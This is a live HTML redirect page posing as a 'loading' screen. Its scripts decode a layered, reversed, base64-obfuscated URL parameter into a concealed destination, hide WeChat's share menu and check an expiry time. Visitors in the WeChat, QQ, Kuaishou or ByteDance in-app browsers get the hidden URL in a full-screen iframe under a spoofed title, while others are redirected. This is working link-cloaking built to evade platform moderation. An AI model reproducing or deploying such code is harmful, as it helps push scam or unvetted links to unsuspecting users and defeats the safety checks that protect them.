<!DOCTYPE html>
<html lang="zh">

<head>
    <title>...正在加载中...</title>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
        <style>
        body,
        html {
            width: 100%;
            height: 100%
        }

        * {
            margin: 0;
            padding: 0
        }
    </style>
</head>

<body>
    <script src="http://res.wx.qq.com/open/js/jweixin-1.2.0.js"></script>
<script>
  function onBridgeReady() {
    WeixinJSBridge.call('hideOptionMenu');
  }

  if (typeof WeixinJSBridge == "undefined") {
    if (document.addEventListener) {
      document.addEventListener('WeixinJSBridgeReady', onBridgeReady, false);
    } else if (document.attachEvent) {
      document.attachEvent('WeixinJSBridgeReady', onBridgeReady);
      document.attachEvent('onWeixinJSBridgeReady', onBridgeReady);
    }
  } else {
    onBridgeReady();
  }
</script>
    <script type="text/javascript">
        function decodeBase64(input) {
            const padding = '='.repeat((4 - (input.length % 4)) % 4);
            const base64 = (input + padding).replace(/-/g, '+').replace(/_/g, '/');
            const rawData = atob(base64);
            let result = '';

            for (let i = 0; i < rawData.length; i++) {
                const charCode = rawData.charCodeAt(i);
                result += String.fromCharCode(charCode);
            }

            return result;
        }

        var fullURL = window.location.href;
        var urlParams = new URLSearchParams(fullURL);
        var t = urlParams.get('t');
        if (t) {
            var encodedData2 = t.split('').reverse().join('');
            var randomChars2 = encodedData2.substr(1, 10);
            var modifiedData2 = encodedData2.replace(randomChars2, "");
            var decodedData2 = decodeBase64(modifiedData2);
            var randomChars1 = decodedData2.substr(1, 10);
            var modifiedData1 = decodedData2.replace(randomChars1, "");
            var yuanjg = decodeURIComponent(decodeBase64(modifiedData1));
            var uu = yuanjg.match(/uu=([^&]+)/)?.[1];
            u = uu ? decodeBase64(uu) : null;
            var sj = yuanjg.match(/sj=([^&]+)/)?.[1];
            var bt = yuanjg.match(/bt=([^&]+)/)?.[1];
            var sx = yuanjg.match(/sx=([^&]+)/)?.[1];
            sx = sx ? decodeBase64(sx) : null;
        }
    </script>
    <script>
    if(!bt||bt=='undefined'||bt=='null'||bt==''){
                       var bt = 'NOTFOUND.';
                    }
        if (typeof yuanjg == 'undefined') {
            window.location.href = 'https://qzone.qq.com/404';
        } else {
             if(sx ==null){
                var sx= "https://www.baidu.com/?tn=49055317_59_hao_pg";
            }
            var timestamp = Math.round(new Date().getTime() / 1000).toString();
            if (timestamp > sj) {
                window.location.href = sx;
            } else {
                var ua = navigator.userAgent.toString();
                if (ua.indexOf("MicroMessenger/") !== -1 || ua.indexOf("QQ/") !== -1 || ua.indexOf("Kwai/") !== -1 || ua.indexOf("BytedanceWebview/") !== -1) {
                    
                    document.title = bt;
                } else {
                    window.location.href = u;
                }
            }
        }
    </script>
    <script>
        function parseQueryString(url) {
            var result = {};
            var str = url.split("?")[1];
            if (str == undefined)
                return result;
            var items = str.split("&")

            var arr;
            for (var i = 0; i < items.length; i++) {
                arr = items[i].split("=");
                result[arr[0]] = arr[1];
            }
            return result;
        };

        function cc() {
            var params = parseQueryString(window.location.href);
            var orderId = params.orderId;
            document.getElementById("reportFrame").src = u;

        }
    </script>
    <script>
        window.onload = cc;
    </script>
    <iframe id="reportFrame" height="100%" marginHeight=0 src="" frameBorder=0 width="100%" name="reportFrame" marginWidth=0 allowfullscreen="true"></iframe>
</body>

</html>